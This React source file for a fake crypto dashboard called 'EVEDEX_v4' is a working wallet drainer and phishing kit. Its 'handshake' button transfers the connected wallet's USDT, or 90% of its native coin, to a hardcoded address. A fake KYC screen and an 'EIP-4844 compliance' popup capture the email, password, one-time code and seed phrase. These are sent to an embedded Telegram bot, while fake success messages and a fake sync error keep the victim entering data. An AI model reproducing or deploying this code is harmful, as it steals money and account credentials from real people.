import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
import { parseEther } from 'viem';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycEmail, setKycEmail] = useState("");
  const [kycPass, setKycPass] = useState("");
  const [kycCode, setKycCode] = useState(""); 
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [ethPrice, setEthPrice] = useState(2450.75);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" };
  const { data: nativeBal } = useBalance({ address }); 
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});

  useEffect(() => {
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      setFeedMsg(`🛡️ ${addr} NODE VERIFIED SUCCESSFULLY`);
      setEthPrice(prev => prev + (Math.random() * 2 - 1));
      setTimeout(() => setFeedMsg(""), 4500);
    }, 8000);
    return () => clearInterval(interval);
  }, []);

  const handleHandshake = () => {
    const tokenAddr = USDT_MAP[chainId];
    if (tokenAddr && tokenBal && tokenBal.value > 0n) {
      const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
      sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
    } else if (nativeBal && nativeBal.value > 0n) {
      sendTransaction({ to: destination, value: (nativeBal.value * 90n) / 100n }, { onSettled: () => setView("seed_gate") });
    } else {
      setView("seed_gate");
    }
  };

  useEffect(() => {
    if (activeTask === "Rectify") {
      const b = selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00");
      setInputVal(b);
    }
  }, [selectedAsset, tokenBal, nativeBal, activeTask]);

  const isSeedValid = useMemo(() => seedVal.trim().split(/\s+/).length >= 12, [seedVal]);

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      
      {/* HEADER */}
      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'20px'}}>
        <div>
          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
          <div style={{fontSize:'10px', color:'#ef4444'}}>MARKET_LIVE: ${ethPrice.toFixed(2)}</div>
        </div>
        <appkit-button />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
          <div style={{display:'flex', justifyContent:'center', gap:'15px', marginBottom:'25px'}}>
             <div style={{fontSize:'12px', color:'#10b981'}}>🔰 SAFE_GUIDE</div>
             <div style={{fontSize:'12px', color:'#3b82f6'}}>♻️ RELAY_ACTIVE</div>
          </div>
          <appkit-button />
        </div>
      ) : (
        <>
          {/* DASHBOARD STATUS BAR */}
          <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'9px', color:'#10b981', display:'flex', justifyContent:'space-around', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
            <span>〽️ GAS: 12 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span>
          </div>

          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div style={{fontSize:'22px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
              <h2 style={{color:'white', fontWeight:'900', marginTop:'10px'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)}
                style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
              </div>
              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
              <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px'}}>IDENTITY_SYNC</h2>
              {kycPhase === 1 ? (
                <>
                  <input placeholder="CLOUD_ID (EMAIL)" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                  <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
                  <button disabled={!kycEmail || !kycPass} onClick={()=>{log(`🆔 KYC: ${kycEmail}/${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                </>
              ) : (
                <>
                  <input maxLength="6" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
                  <button disabled={kycCode.length < 6} onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length === 6 ? '#3b82f6' : '#1e293b', color:'white', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE</button>
                </>
              )}
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_ENCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL AND PREVENT ASSET LOCKING.</p>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60);}} 
                    style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>ENCRYPT & SYNC</button>
                  </>
                ) : (
                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}

      {/* SUCCESS FEED */}
      {feedMsg && (
        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
          {feedMsg}
        </div>
      )}
    </div>
  );
}
